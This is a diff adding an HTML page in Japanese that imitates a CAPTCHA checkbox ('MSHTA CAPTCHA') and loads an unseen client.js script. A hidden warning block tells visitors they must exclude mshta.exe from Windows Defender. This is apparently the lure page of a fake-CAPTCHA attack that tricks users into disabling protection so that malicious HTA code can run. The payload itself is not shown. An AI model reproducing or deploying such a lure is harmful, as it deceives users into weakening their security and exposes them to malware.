@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="ja">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>MSHTA CAPTCHA</title>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <div class="container">
+      <h1>MSHTA CAPTCHA</h1>
+      <p>チェックボックスをクリックして、認証に進んでください。</p>
+
+      <div class="captcha-container">
+        <div id="captcha-box" onclick="startCaptcha()">
+          <div class="checkbox">
+            <div class="checkmark">✓</div>
+          </div>
+          <div class="label">私はロボットではありません</div>
+        </div>
+        <div class="captcha-logo">
+          <img src="./img/check.png" alt="logo" />
+          <span>CAPTCHA</span>
+        </div>
+      </div>
+
+      <div id="message"></div>
+
+      <div id="warn-block" class="warn-block" hidden>
+        <div class="warn-icon">⚠️</div>
+        <div class="warn-text">
+          <p>
+            Windowsセキュリティ(Windows Defender)で
+            <code>C:\Windows\System32\mshta.exe</code>
+            を除外する必要があります。
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <script src="client.js"></script>
+  </body>
+</html>
